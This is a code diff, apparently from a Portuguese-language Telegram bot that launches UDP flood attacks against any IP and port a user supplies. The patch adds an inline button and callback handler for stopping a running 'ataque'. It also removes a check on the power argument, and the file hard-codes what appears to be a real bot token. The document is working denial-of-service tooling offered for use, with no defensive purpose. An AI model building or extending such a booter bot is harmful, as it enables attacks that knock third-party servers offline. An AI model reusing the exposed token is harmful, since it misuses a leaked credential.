@@ -2,6 +2,7 @@ import telebot
 import subprocess
 import json
 import re
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # Configurações do bot
 BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
@@ -82,13 +83,6 @@ def crash_server(message):
             bot.send_message(message.chat.id, "Por favor, insira um tempo válido.")
             return
 
-    if len(comando) > 3:
-        try:
-            potencia = int(comando[3])
-        except ValueError:
-            bot.send_message(message.chat.id, "Por favor, insira uma potência válida.")
-            return
-
     if ip_porta in processos:
         bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
         return
@@ -98,7 +92,35 @@ def crash_server(message):
     comando_ataque = ["python3", "start.py", "UDP", ip_porta, str(potencia), str(tempo)]
     processo = subprocess.Popen(comando_ataque)
     processos[ip_porta] = processo
-    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} com potência {potencia} por {tempo} segundos.")
+
+    # Criação do botão para parar o ataque
+    markup = InlineKeyboardMarkup()
+    parar_button = InlineKeyboardButton(
+        text="🛑 Parar Ataque",
+        callback_data=f"parar_{ip_porta}"
+    )
+    markup.add(parar_button)
+
+    bot.send_message(
+        message.chat.id,
+        f"Ataque iniciado para {ip_porta} com potência {potencia} por {tempo} segundos.",
+        reply_markup=markup
+    )
+
+# Manipulador de callback para parar ataques
+@bot.callback_query_handler(func=lambda call: call.data.startswith("parar_"))
+def parar_ataque(call):
+    ip_porta = call.data.split("_", 1)[1]
+    if ip_porta in processos:
+        processos[ip_porta].terminate()
+        del processos[ip_porta]
+        bot.edit_message_text(
+            chat_id=call.message.chat.id,
+            message_id=call.message.id,
+            text=f"Ataque para {ip_porta} foi parado com sucesso."
+        )
+    else:
+        bot.answer_callback_query(call.id, "Nenhum ataque ativo para este IP.")
 
 # Comando /adduser e /removeuser
 @bot.message_handler(commands=['adduser', 'removeuser'])
